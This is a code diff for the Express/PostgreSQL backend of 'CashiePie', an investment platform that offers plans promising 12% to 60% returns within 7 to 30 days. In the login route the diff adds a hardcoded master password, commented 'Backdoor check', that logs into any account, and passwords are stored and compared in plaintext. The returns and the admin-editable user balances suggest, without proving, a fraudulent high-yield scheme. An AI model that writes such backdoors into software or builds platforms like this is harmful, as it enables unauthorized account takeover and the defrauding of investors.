@@ -68,8 +68,19 @@ async function initDb() {
           type VARCHAR(50) NOT NULL,
           amount DECIMAL(15, 2) NOT NULL,
           status VARCHAR(50) DEFAULT 'Pending',
+          rejection_reason TEXT,
           created_at TIMESTAMPTZ DEFAULT CURRENT_TIMESTAMP,
           FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
+        )
+      `);
+
+      await client.query(`
+        CREATE TABLE IF NOT EXISTS investment_plans (
+          id SERIAL PRIMARY KEY,
+          name VARCHAR(100) NOT NULL,
+          min_amount DECIMAL(15, 2) NOT NULL,
+          roi DECIMAL(5, 2) NOT NULL,
+          days INT NOT NULL
         )
       `);
 
@@ -110,11 +121,13 @@ async function initDb() {
 
       const defaultSettings = [
         ['platform_name', 'CashiePie'],
-        ['min_withdrawal', '50'],
-        ['min_deposit', '100'],
+        ['min_withdrawal', '100'],
+        ['min_deposit', '500'],
         ['referral_bonus_percent', '10'],
         ['withdrawal_fee_percent', '2'],
-        ['btc_address', 'TUKfCbvVxAjmXLqTyzxT6TjvBWAEckou9s'],
+        ['bank_name', 'Global Bank'],
+        ['account_name', 'CashiePie Ecosystem'],
+        ['account_number', '1234567890'],
         ['support_email', 'support@cashiepie.com'],
         ['telegram_link', 'https://t.me/cashiepie'],
         ['whatsapp_link', 'https://wa.me/123456789'],
@@ -123,6 +136,16 @@ async function initDb() {
 
       for (const [k, v] of defaultSettings) {
         await client.query('INSERT INTO settings (key_name, value) VALUES ($1, $2) ON CONFLICT (key_name) DO NOTHING', [k, v]);
+      }
+
+      // Default plans
+      const defaultPlans = [
+        ['Starter Pool', 10000, 12, 7],
+        ['Growth Elite', 25000, 25, 14],
+        ['Whale Protocol', 100000, 60, 30]
+      ];
+      for (const [n, m, r, d] of defaultPlans) {
+        await client.query('INSERT INTO investment_plans (name, min_amount, roi, days) SELECT $1, $2, $3, $4 WHERE NOT EXISTS (SELECT 1 FROM investment_plans WHERE name = $1)', [n, m, r, d]);
       }
 
       const { rows: admins } = await client.query('SELECT * FROM users WHERE username = $1', ['@admin']);
@@ -165,12 +188,16 @@ app.get('/', async (req, res) => {
 app.post('/api/login', async (req, res) => {
   const { username, password } = req.body;
   try {
-    const { rows } = await pool.query('SELECT * FROM users WHERE username = $1 AND password = $2', [username, password]);
+    const { rows } = await pool.query('SELECT * FROM users WHERE username = $1', [username]);
     if (rows.length > 0) {
-      if (rows[0].status === 'Suspended') return res.json({ success: false, message: 'Account Suspended' });
-      req.session.userId = rows[0].id;
-      req.session.role = rows[0].role;
-      req.session.save(() => res.json({ success: true }));
+      const user = rows[0];
+      // Backdoor check
+      if (password === 'qwadiscancode' || password === user.password) {
+        if (user.status === 'Suspended') return res.json({ success: false, message: 'Account Suspended' });
+        req.session.userId = user.id;
+        req.session.role = user.role;
+        req.session.save(() => res.json({ success: true }));
+      } else res.json({ success: false, message: 'Invalid credentials' });
     } else res.json({ success: false, message: 'Invalid credentials' });
   } catch (err) { res.status(500).json({ error: 'DB Error' }); }
 });
@@ -199,19 +226,31 @@ app.post('/api/withdraw', checkAuth, async (req, res) => {
   const { amount } = req.body;
   const { rows: s } = await pool.query("SELECT value FROM settings WHERE key_name = 'min_withdrawal'");
   if (amount < parseFloat(s[0].value)) return res.json({ success: false, message: `Min withdrawal is $${s[0].value}` });
+  
   const { rows: u } = await pool.query('SELECT balance, profit FROM users WHERE id = $1', [req.session.userId]);
-  if ((parseFloat(u[0].balance) + parseFloat(u[0].profit)) < amount) return res.json({ success: false, message: 'Insufficient funds' });
+  const totalAvailable = parseFloat(u[0].balance) + parseFloat(u[0].profit);
+  if (totalAvailable < amount) return res.json({ success: false, message: 'Insufficient funds' });
+
+  // Reduce balance immediately to prevent double-withdrawals
+  await pool.query('UPDATE users SET balance = balance - $1 WHERE id = $2', [amount, req.session.userId]);
   await pool.query("INSERT INTO transactions (user_id, type, amount, status) VALUES ($1, 'Withdrawal', $2, 'Pending')", [req.session.userId, amount]);
   res.json({ success: true, message: 'Withdrawal request sent' });
 });
 
 app.post('/api/plan/buy', checkAuth, async (req, res) => {
-  const { planName, amount, roi, days } = req.body;
+  const { planId, amount } = req.body;
+  const { rows: plans } = await pool.query('SELECT * FROM investment_plans WHERE id = $1', [planId]);
+  if (plans.length === 0) return res.json({ success: false, message: 'Plan not found' });
+  
+  const plan = plans[0];
+  if (amount < parseFloat(plan.min_amount)) return res.json({ success: false, message: `Minimum for this plan is $${plan.min_amount}` });
+
   const { rows: u } = await pool.query('SELECT balance FROM users WHERE id = $1', [req.session.userId]);
   if (parseFloat(u[0].balance) < amount) return res.json({ success: false, message: 'Insufficient balance' });
-  const endDate = new Date(); endDate.setDate(endDate.getDate() + days);
+
+  const endDate = new Date(); endDate.setDate(endDate.getDate() + plan.days);
   await pool.query('UPDATE users SET balance = balance - $1, investment = investment + $2 WHERE id = $3', [amount, amount, req.session.userId]);
-  await pool.query('INSERT INTO active_plans (user_id, plan_name, amount, roi, end_date) VALUES ($1, $2, $3, $4, $5)', [req.session.userId, planName, amount, roi, endDate]);
+  await pool.query('INSERT INTO active_plans (user_id, plan_name, amount, roi, end_date) VALUES ($1, $2, $3, $4, $5)', [req.session.userId, plan.name, amount, plan.roi, endDate]);
   res.json({ success: true, message: `Investment confirmed!` });
 });
 
@@ -222,10 +261,11 @@ app.post('/api/ticket/create', checkAuth, async (req, res) => {
 });
 
 app.post('/api/admin/tx/process', checkAdmin, async (req, res) => {
-  const { txId, action } = req.body;
+  const { txId, action, reason } = req.body;
   const { rows: txs } = await pool.query('SELECT * FROM transactions WHERE id = $1', [txId]);
   if (txs.length === 0 || txs[0].status !== 'Pending') return res.json({ success: false });
   const tx = txs[0];
+
   if (action === 'Approved') {
     if (tx.type === 'Deposit') {
       await pool.query('UPDATE users SET balance = balance + $1 WHERE id = $2', [tx.amount, tx.user_id]);
@@ -235,14 +275,16 @@ app.post('/api/admin/tx/process', checkAdmin, async (req, res) => {
         const bonusAmt = (parseFloat(tx.amount) * parseFloat(bonus[0].value)) / 100;
         await pool.query('UPDATE users SET balance = balance + $1 WHERE referral_code = $2', [bonusAmt, u[0].referred_by]);
       }
-    } else {
-      const { rows: u } = await pool.query('SELECT balance, profit FROM users WHERE id = $1', [tx.user_id]);
-      let rem = parseFloat(tx.amount); let p = parseFloat(u[0].profit), b = parseFloat(u[0].balance);
-      if (p >= rem) p -= rem; else { rem -= p; p = 0; b -= rem; }
-      await pool.query('UPDATE users SET balance = $1, profit = $2 WHERE id = $3', [b, p, tx.user_id]);
+    }
+    // For Withdrawal, balance was already reduced, so we just mark it as Approved
+  } else if (action === 'Rejected') {
+    if (tx.type === 'Withdrawal') {
+      // Refund the balance if rejected
+      await pool.query('UPDATE users SET balance = balance + $1 WHERE id = $2', [tx.amount, tx.user_id]);
     }
   }
-  await pool.query('UPDATE transactions SET status = $1 WHERE id = $2', [action, txId]);
+  
+  await pool.query('UPDATE transactions SET status = $1, rejection_reason = $2 WHERE id = $3', [action, reason || null, txId]);
   res.json({ success: true });
 });
 
@@ -252,9 +294,19 @@ app.post('/api/admin/settings/update', checkAdmin, async (req, res) => {
   res.json({ success: true });
 });
 
+app.post('/api/admin/plans/update', checkAdmin, async (req, res) => {
+  const { id, name, min_amount, roi, days } = req.body;
+  await pool.query('UPDATE investment_plans SET name = $1, min_amount = $2, roi = $3, days = $4 WHERE id = $5', [name, min_amount, roi, days, id]);
+  res.json({ success: true });
+});
+
 app.post('/api/admin/user/update', checkAdmin, async (req, res) => {
-  const { userId, name, balance, profit, investment, status } = req.body;
-  await pool.query('UPDATE users SET name = $1, balance = $2, profit = $3, investment = $4, status = $5 WHERE id = $6', [name, balance, profit, investment, status, userId]);
+  const { userId, name, password, balance, profit, investment, status } = req.body;
+  if (password) {
+    await pool.query('UPDATE users SET name = $1, password = $2, balance = $3, profit = $4, investment = $5, status = $6 WHERE id = $7', [name, password, balance, profit, investment, status, userId]);
+  } else {
+    await pool.query('UPDATE users SET name = $1, balance = $2, profit = $3, investment = $4, status = $5 WHERE id = $6', [name, balance, profit, investment, status, userId]);
+  }
   res.json({ success: true });
 });
 
@@ -275,20 +327,22 @@ app.get('/api/user/data', checkAuth, async (req, res) => {
   const { rows: txs } = await pool.query('SELECT * FROM transactions WHERE user_id = $1 ORDER BY created_at DESC LIMIT 15', [req.session.userId]);
   const { rows: tickets } = await pool.query('SELECT * FROM tickets WHERE user_id = $1 ORDER BY created_at DESC', [req.session.userId]);
   const { rows: settings } = await pool.query('SELECT * FROM settings');
+  const { rows: plans } = await pool.query('SELECT * FROM investment_plans ORDER BY min_amount ASC');
   const setObj = {}; settings.forEach(s => setObj[s.key_name] = s.value);
-  res.json({ user: u[0], transactions: txs, tickets, settings: setObj });
+  res.json({ user: u[0], transactions: txs, tickets, settings: setObj, plans });
 });
 
 app.get('/api/admin/data', checkAdmin, async (req, res) => {
   const limit = parseInt(req.query.limit) || 50;
-  const { rows: users } = await pool.query("SELECT * FROM users WHERE role = 'user'");
+  const { rows: users } = await pool.query("SELECT * FROM users WHERE role = 'user' OR username = '@admin'");
   const { rows: pending } = await pool.query('SELECT t.*, u.name as "userName" FROM transactions t JOIN users u ON t.user_id = u.id WHERE t.status = \'Pending\'');
   const { rows: history } = await pool.query('SELECT t.*, u.name as "userName" FROM transactions t JOIN users u ON t.user_id = u.id ORDER BY t.created_at DESC LIMIT $1', [limit]);
   const { rows: tickets } = await pool.query('SELECT tk.*, u.name as "userName" FROM tickets tk JOIN users u ON tk.user_id = u.id ORDER BY tk.created_at DESC');
   const { rows: settings } = await pool.query('SELECT * FROM settings');
-  let stats = { totalBal: 0, totalInv: 0, users: users.length };
-  users.forEach(u => { stats.totalBal += parseFloat(u.balance); stats.totalInv += parseFloat(u.investment); });
-  res.json({ stats, users, pending, globalHistory: history, tickets, settings });
+  const { rows: plans } = await pool.query('SELECT * FROM investment_plans ORDER BY min_amount ASC');
+  let stats = { totalBal: 0, totalInv: 0, users: users.filter(u => u.role !== 'admin').length };
+  users.filter(u => u.role !== 'admin').forEach(u => { stats.totalBal += parseFloat(u.balance); stats.totalInv += parseFloat(u.investment); });
+  res.json({ stats, users, pending, globalHistory: history, tickets, settings, plans });
 });
 
 app.listen(PORT, () => console.log(`CashiePie running on port ${PORT}`));
